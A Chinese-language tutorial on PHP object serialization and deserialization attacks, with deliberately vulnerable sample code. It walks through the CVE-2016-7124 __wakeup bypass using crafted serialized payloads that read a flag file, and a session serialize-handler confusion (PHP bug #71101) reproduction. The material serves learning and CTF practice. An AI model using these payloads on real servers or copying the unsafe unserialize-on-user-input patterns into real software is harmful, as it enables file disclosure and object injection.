# PHP序列化与反序列化
## PHP序列化与反序列化技术原理
计算机在储存类似结构体，类这种变量，函数之间存在抽象关系的数据时，对于其中的种种关系的储存往往非常繁琐
因此，将需要存储的数据进行转化使其成为一种可以轻松存储与解析的数据流，这就是序列化与反序列化技术。
## PHP序列化
实例
~~~php
<?php
class A{		//定义类 A,分别设置公有、私有、保护变量
    public $X1='1';			
    private $X2='2';
    protected $X3='3';
}

$o = new A();			//创建对象
echo serialize($o);		//输出对象$o的序列化
?>
~~~
![NmCjHA.png](https://s1.ax1x.com/2020/06/18/NmCjHA.png)
`对象类型:对象名长度:“对象名”:对象成员变量个数:{变量1类型:变量名1长度:变量名1; 参数1类型:参数1长度:参数1; 变量2类型:变量名2长度:“变量名2”; 参数2类型:参数2长度:参数2;… …}`
对象类型：Class：用O表示，Array：用a表示。
变量和参数类型：
    string：用s表示
    Int：用i表示
    Array:用a表示
序列符号：参数与变量之间用分号(;)隔开,同一变量和同一参数之间的数据用冒号(:)隔开。

可以看到`PHP`
对`public`属性进行序列化时不对属性名进行操作
对`private`属性进行序列化时会在属性名前加`A`
对`protected`属性进行序列化操作时会在属性名前加`*`
但是，在长度位置，`X2`的长度变为**5**，`X3`的长度变为**5**
这是因为序列化操作不仅会增加`A``*`还会对不同属性的属性名增加空字符`\00`
对`public`属性进行序列化时直接显示属性名
对`private`属性进行序列化时会在属性名前增加0x00classname0x00，其长度会增加类名长度+2
对`protected`属性进行序列化操作时会在属性名前增加0x00*0x00，其长度会增加3
因此，`X2`前的`A`应为其所对应的类名

## PHP反序列化攻击
在序列化与反序列化操作时，存在一些自动触发的函数，成为魔术方法
### 魔术方法
|方法|触发条件或作用|
|:--|:--|
|__construct() | 类的构造函数 |
|__destruct()  | 类的析构函数 |
|__call()   | 在对象中调用一个不可访问方法时调用 |
|__callStatic()  | 用静态方式中调用一个不可访问方法时调用 |
|__get()   | 获得一个类的成员变量时调用 |
|__set()   | 设置一个类的成员变量时调用 |
|__isset()   | 当对不可访问属性调用isset()或empty()时调用 |
|__unset()  | 当对不可访问属性调用unset()时被调用。 |
|__sleep()  | 执行serialize()时，先会调用这个函数 |
|__wakeup()   | 执行unserialize()时，先会调用这个函数 |
|__toString()  | 类被当成字符串时的回应方法 |
|__invoke()  | 用函数的方式调用一个对象时的回应方法 |
|__set_state()   | 调用var_export()导出类时，此静态方法会被调用。 |
|__clone()   | 当对象复制完成时调用 |
|__autoload()  | 尝试加载未定义的类 |
|__debugInfo()  | 打印所需调试信息 |
实例分析
~~~php
<?php 
class Caiji{
    public function __construct($ID, $sex, $age){
        $this->ID = $ID;
        $this->sex = $sex;
        $this->age = $age;
        $this->info = sprintf("ID: %s, age: %d, sex: %s", $this->ID, $this->sex, $this->age);
    }

    public function getInfo(){
        echo $this->info . '<br>';
    }
    /**
     * serialize前调用 用于删选需要被序列化存储的成员变量
     */
    public function __sleep(){
        echo __METHOD__ . '<br>';
        return ['ID', 'sex', 'age'];
    }
    /**
     * unserialize前调用 用于预先准备对象资源
     */
    public function __wakeup(){
        echo __METHOD__ . '<br>';
        $this->info = sprintf("ID: %s, age: %d, sex: %s", $this->ID, $this->sex, $this->age);
    }
}

$me = new Caiji('twosmi1e', 20, 'male');

$me->getInfo();
//存在__sleep()函数，$info属性不会被存储
$temp = serialize($me);
echo $temp . '<br>';

$me = unserialize($temp);
//__wakeup()组装的$info
$me->getInfo();

?>
~~~
![NR8QSK.png](https://s1.ax1x.com/2020/06/28/NR8QSK.png)
根据程序的运行结果可以发现，`sleep()`在序列化开始前运行，`wakeup()`现在反序列化开始前运行
![NRJZP1.png](https://s1.ax1x.com/2020/06/28/NRJZP1.png)
## `__wakeup()`绕过攻击
~~~php
<?php 
class SoFun{ 
  protected $file='index.php';
  function __destruct(){ 
    if(!empty($this->file)) {
      if(strchr($this-> file,"\\")===false &&  strchr($this->file, '/')===false)
        show_source(dirname (__FILE__).'/'.$this ->file);
      else
        die('Wrong filename.');
    }
  }  
  function __wakeup(){
   $this-> file='index.php';
  } 
  public function __toString()
    return '' ;
  }
}     
if (!isset($_GET['file'])){ 
  show_source('index.php');
}
else{ 
  $file=base64_decode($_GET['file']); 
  echo unserialize($file); 
}
?> #<!--key in flag.php-->
~~~
可以看到，想要得到`flag`只有通过`show_source(dirname (__FILE__).'/'.$this ->file);`这条语句才可以
然而在我们进行反序列化时，`__wakeup()`就将`file`定向为`index.php`
因此我们需要绕过`__wakeup()`

#### 漏洞利用`CVE-2016-7124`
漏洞影响版本：
`PHP5 < 5.6.25`
`PHP7 < 7.0.10`
当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过`__wakeup`的执行

因此构造`payload`
`O:5:"SoFun":2:{s:7:"\00*\00file";s:5:"1.php";}`
                      ↓
                 将属性个数更改即可绕过`__wakeup()`
对`payload`进行`base64`加密
`Tzo1OiJTb0Z1biI6Mjp7czo3OiJcMDAqXDAwZmlsZSI7czo1OiIxLnBocCI7fQ==`
![NIcbnK.png](https://s1.ax1x.com/2020/06/30/NIcbnK.png)
然而`payload`并未成功

修改后发现，属性名前的`s`需要大写`S`
`O:5:"SoFun":2:{S:7:"\00*\00file";s:5:"1.php";}`
				           ↑
![NoKlUH.png](https://s1.ax1x.com/2020/07/01/NoKlUH.png)

加强
~~~php
<?php 
    error_reporting(0);
    class Twosmil1e{
        public $key = 'twosmi1e';
        function __destruct(){
            if(!empty($this->key)){
                if($this->key == 'twosmi1e')
                    echo 'success';
            }
        }
        function __wakeup(){
            $this->key = 'you failed 23333';
            echo $this->key;
        }
        public function __toString(){
            return '';
        }
    }
    if(!isset($_GET['answer'])){
        show_source('serializetest.php');
    }else{
        $answer = $_GET['answer'];
        echo $answer;
        echo '<br>';
        echo unserialize($answer);
    }

 ?>
~~~
`O:9:"Twosmil1e":2:{S:3:"key";s:8:"twosmi1e";}`
![N7n0eO.png](https://s1.ax1x.com/2020/07/01/N7n0eO.png)

## PHP session反序列化漏洞
`session`是`php`的一种保存机制，在网站访问时通常时多个界面协同运作，在各个界面之间需要全局信息或者内容保持时就用到`session`来保存相关内容
该功能类似`cookie`，但是两者存在不同
`session`的储存是文件储存，且文件存储在服务器端
`cookie`是储存于浏览器
因此，`session`相较于`cookie`安全性更高
![aSVrSH.png](https://s1.ax1x.com/2020/07/25/aSVrSH.png)

### `php.ini`中的`session`的配置
|配置项|描述|
|:--|:--|
|session.save_path|该配置主要设置session的存储路径|
|session.save_handler |设定用户自定义存储函数|
|session.auto_start |指定会话模块是否在请求开始时启动一个会话|
|session.serialize_handler |定义用来序列化/反序列化的处理器名字。默认使用php|
### `session`的储存机制
#### 序列化/反序列化处理器
|处理器名称|	存储格式|
|:--|:--|
|php|键名 + 竖线 + 经过serialize()函数序列化处理的值|
|php_binary|	键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值|
|php_serialize    (php >= 5.5.4)|经过serialize()函数序列化处理的数组|
`php`序列化/反序列化处理器由`php.ini`中的`session.serialize_handler`控制，默认为`php`
![N7qsyV.png](https://s1.ax1x.com/2020/07/01/N7qsyV.png)

##### 处理器对比
保存路径
![N7LY11.png](https://s1.ax1x.com/2020/07/01/N7LY11.png)
###### php
~~~php
<?php
    ini_set('session.serialize_handler','php');			//修改处理器,临时修改
    session_start();
    $_SESSION['session'] = $_GET['test'];
?>
~~~
![N7XndU.png](https://s1.ax1x.com/2020/07/01/N7XndU.png)
~~~
php	键名 + 竖线 + 经过serialize()函数序列化处理的值
      ↓     ↓       ↓
     session|s:8:"test_php";
~~~
![N7XlW9.png](https://s1.ax1x.com/2020/07/01/N7XlW9.png)
###### php_binary
~~~php
<?php
    ini_set('session.serialize_handler','php_binary');			//修改处理器,临时修改
    session_start();
    $_SESSION['session'] = $_GET['test'];
?>
~~~
![Nb0Ghd.png](https://s1.ax1x.com/2020/07/02/Nb0Ghd.png)
~~~
php_binary	键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值
                                   ↓      ↓     ↓
                                   sessions:3:"123";
~~~
![Nb0fBT.png](https://s1.ax1x.com/2020/07/02/Nb0fBT.png)
![NbBQvq.png](https://s1.ax1x.com/2020/07/02/NbBQvq.png)
###### php_serialize
~~~php
<?php
    ini_set('session.serialize_handler','php_serialize');			//修改处理器,临时修改
    session_start();
    $_SESSION['session'] = $_GET['test'];
?>
~~~
注意:`php_serialize`需要`php`版本大于`5.5.4`，否则会报错
![NbDVQ1.png](https://s1.ax1x.com/2020/07/02/NbDVQ1.png)
![NbDyyq.png](https://s1.ax1x.com/2020/07/02/NbDyyq.png)
~~~
php_serialize   经过serialize()函数序列化处理的数组
							↓
                a:1:{s:7:"session";s:3:"345";}
~~~
![NbrAAS.png](https://s1.ax1x.com/2020/07/02/NbrAAS.png)
## php bug #71101
`php bug #71101`漏洞产生的根本原因是`php`处理器的混用，导致在序列化与反序列化阶段出现的错误。
例如`php`和`php_serialize`两个处理器
`php`序列化产生的`|`会被`php_serialize`解析为分隔符，进而将后续内容实例化，导致漏洞的产生。

### 复现
`session.php`
~~~php
<?php
    error_reporting(0);
    ini_set('session.serialize_handler','php_serialize');
    session_start();
    $_SESSION['session'] = $_GET['session'];
?>
~~~
`class.php`
~~~php
<?php
    error_reporting(0);
    ini_set('session.serialize_handler','php');
    session_start();
    class TEST{
    public $name = "class's aoligei";
    function __wakeup(){
      echo "class wakeup";
    }
    function __destruct(){
      echo '<br>'.$this->name;
    }
  }
  $str = new TEST();
 ?>
~~~
`payload.php`

~~~php
<?php
  class TEST{
      public $name;
      function __wakeup(){
        echo "payload wakeup";
      }
      function __destruct(){
        echo '<br>'.$this->name;
      }
  }
  $str = new TEST();
  $str->name = "payload's aoligei";
  echo serialize($str);
?>
~~~
阅读代码
`session.php`使用的是`php_serialize`处理器
`class.php`使用的是`php`处理器
`payload.php`用来生产所需的序列化数据
首先传入`session.php`观察产生效果
![aSuxyQ.png](https://s1.ax1x.com/2020/07/25/aSuxyQ.png)
直接访问`class.php`
![aSlz90.png](https://s1.ax1x.com/2020/07/25/aSlz90.png)
然后使用`payload.php`产生所需`payload`
![aSMQBj.png](https://s1.ax1x.com/2020/07/25/aSMQBj.png)
使用产生的`payload`传入`session.php`，并加上`|`
![aSleOg.png](https://s1.ax1x.com/2020/07/25/aSleOg.png)
查看`session`产生的`tmp`文件
![aSllYq.png](https://s1.ax1x.com/2020/07/25/aSllYq.png)
可以发现`|`已加入
再次访问`class.php`
![aSlqBQ.png](https://s1.ax1x.com/2020/07/25/aSlqBQ.png)























































参考文章
https://xz.aliyun.com/t/3674
https://xz.aliyun.com/t/6640
https://www.anquanke.com/post/id/197787
https://blog.spoock.com/2016/10/16/php-serialize-problem/


